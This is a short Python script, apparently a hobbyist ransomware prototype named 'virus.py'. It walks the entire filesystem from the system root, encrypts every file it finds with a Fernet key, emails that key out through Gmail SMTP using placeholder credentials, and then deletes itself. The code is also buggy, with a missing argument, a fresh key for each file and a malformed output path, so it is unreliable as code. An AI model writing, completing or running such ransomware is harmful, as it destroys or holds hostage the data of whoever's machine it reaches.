from cryptography.fernet import Fernet
from datetime import datetime
import os
import platform
from pathlib import Path
import smtplib
from email.mime.text import MIMEText
import base64

def load_key():
    key=Fernet.generate_key()
    key_str = base64.urlsafe_b64encode(key).decode('utf-8')
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    email = "sender_email"
    password = "your_app_password"
    to_email = "reciever_email"  
    subject = "Encryption Key"
    body = f"Your encryption key: {key_str}\n\nKeep this safe!"
    
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = email
    msg['To'] = to_email
    
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email, password)
        server.send_message(msg)
        server.quit()
        
        print("✅ Encryption key sent via email!")
            
        return key
        
    except Exception as e:
        print(f"❌ Failed to send email: {e}")
        return None


def encrypt_file(file):
    key=load_key()
    file_encryption=Fernet(key)
    with open(file,"rb") as file_read:
        content=file_read.read()
    encrypted_content=file_encryption.encrypt(content)
    with open(os.path.join(file,".encrypted"),"wb") as file_write:
        file_write.write(encrypted_content)

def encrypt_directory(root_dir, key):
    key = Fernet(key)
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path == os.path.abspath(__file__):
                continue
            else:
                encrypt_file(file_path)

def get_system_root():
    system = platform.system().lower()
    if system == "windows":
        return "C:\\" 
    elif system in ["linux", "darwin"]: 
        return "/"
    else:
        return os.path.abspath(os.sep)  

root_dir = get_system_root()
encrypt_directory(root_dir)
os.remove("virus.py")
